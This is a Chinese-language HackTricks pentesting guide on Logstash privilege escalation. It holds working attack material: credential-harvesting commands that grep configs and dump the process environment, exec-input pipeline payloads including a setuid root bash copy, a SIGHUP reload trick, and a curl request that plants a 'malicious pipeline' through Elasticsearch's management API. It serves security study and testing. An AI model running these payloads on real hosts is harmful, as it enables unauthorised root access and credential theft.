# Logstash Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash 用于通过一种被称为 **pipelines** 的系统来**收集、转换和分发日志**。这些 pipelines 由 **input**、**filter** 和 **output** 阶段组成。当 Logstash 在已被攻陷的机器上运行时，会出现一个有趣的情况。

### Pipeline Configuration

Pipelines 在文件 **/etc/logstash/pipelines.yml** 中配置，该文件列出了 pipeline 配置的位置：
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
该文件揭示了包含 pipeline 配置的 **.conf** 文件所在位置。 当使用 **Elasticsearch output module** 时，**pipelines** 中通常包含 **Elasticsearch credentials**，这些凭据往往拥有较高权限，因为 Logstash 需要向 Elasticsearch 写入数据。配置路径中的通配符允许 Logstash 在指定目录中执行所有匹配的 pipelines。

如果 Logstash 使用 `-f <directory>` 启动而不是 `pipelines.yml`，**该目录中的所有文件会按字典序连接并作为单个配置解析**。这带来两个可被利用的影响：

- 投放一个文件（例如 `000-input.conf` 或 `zzz-output.conf`）可以改变最终 pipeline 的组装方式
- 一个格式错误的文件可能导致整个 pipeline 无法加载，因此在依赖自动重载前请谨慎验证 payloads

### 在已被攻陷的主机上快速枚举

在安装了 Logstash 的主机上，快速检查：
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
还要检查本地监控 API 是否可访问。默认绑定在 **127.0.0.1:9600**，在登陆主机后这通常就足够了：
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
这通常会给出 pipeline ID、运行时详情，以及确认你修改的 pipeline 已被加载。

从 Logstash 恢复的凭证通常可以解锁 **Elasticsearch**，所以请查看 [this other page about Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md)。

### Privilege Escalation via Writable Pipelines

要尝试提权，首先识别 Logstash 服务以哪个用户运行，通常是 **logstash** 用户。确保你满足以下任一条件：

- 对某个 pipeline **.conf** 文件具有**写访问权限** **或**
- /etc/logstash/pipelines.yml 文件使用通配符，并且你可以写入目标文件夹

此外，必须满足以下任一条件：

- 能够重启 Logstash 服务 **或**
- /etc/logstash/logstash.yml 文件中设置了 **config.reload.automatic: true**

如果配置中存在通配符，创建与之匹配的文件就可以执行命令。例如：
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
这里，**interval** 决定以秒为单位的执行频率。在示例中，**whoami** 命令每 120 秒运行一次，其输出被重定向到 **/tmp/output.log**。

在 **/etc/logstash/logstash.yml** 中设置 **config.reload.automatic: true** 后，Logstash 会自动检测并应用新建或被修改的 pipeline 配置，而无需重启。如果没有使用通配符，仍然可以对现有配置进行修改，但建议小心操作以避免中断。

### 更可靠的 Pipeline Payloads

`exec` input plugin 在当前版本中仍然可用，并且需要 `interval` 或 `schedule` 之一。它通过 **forking** Logstash JVM 来执行，因此当内存不足时，你的 payload 可能会以 `ENOMEM` 失败，而不是悄无声息地运行。

一个更实用的 privilege-escalation payload 通常是会留下持久痕迹的：
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
如果你没有重启权限但可以向进程发送信号，Logstash 也支持在类 Unix 系统上通过 **SIGHUP** 触发的重载：
```bash
kill -SIGHUP $(pgrep -f logstash)
```
注意，并非所有插件都支持自动重载。例如，**stdin** 输入会阻止自动重载，因此不要假设 `config.reload.automatic` 总是会采纳你的更改。

### 从 Logstash 窃取秘密

在只追求代码执行之前，先收集 Logstash 已经可以访问的数据：

- 明文凭据常常硬编码在 `elasticsearch {}` 输出、`http_poller`、JDBC 输入，或云相关设置中
- 安全设置可能保存在 **`/etc/logstash/logstash.keystore`** 或另一个 `path.settings` 目录中
- keystore 密码通常通过 **`LOGSTASH_KEYSTORE_PASS`** 提供，基于包的安装通常从 **`/etc/sysconfig/logstash`** 获取它
- 环境变量展开 `${VAR}` 在 Logstash 启动时解析，因此值得检查服务的环境

有用的检查项：
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
这也值得检查，因为 **CVE-2023-46672** 显示在特定情况下 Logstash 可能会在日志中记录敏感信息。在 post-exploitation 主机上，旧的 Logstash 日志和 `journald` 条目可能因此披露凭证，即使当前配置引用了 `keystore` 而不是将秘密内联存储。

### 集中式 Pipeline 管理滥用

在某些环境中，主机根本不依赖本地 `.conf` 文件。如果配置了 **`xpack.management.enabled: true`**，Logstash 可以从 Elasticsearch/Kibana 拉取集中管理的 pipelines，启用此模式后，本地 pipeline 配置不再是事实来源。

这意味着一种不同的攻击路径：

1. 从本地 Logstash 设置、keystore 或日志中恢复 Elastic 凭证
2. 验证该帐户是否具有 **`manage_logstash_pipelines`** 集群权限
3. 创建或替换一个集中管理的 pipeline，使 Logstash 主机在下一次轮询时执行你的有效负载

用于此功能的 Elasticsearch API 是：
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
当本地文件为只读且 Logstash 已注册以远程获取 pipelines 时，这尤其有用。

## References

- [Elastic Docs: Reloading the Config File](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [Elastic Docs: Configure Centralized Pipeline Management](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)

{{#include ../../banners/hacktricks-training.md}}
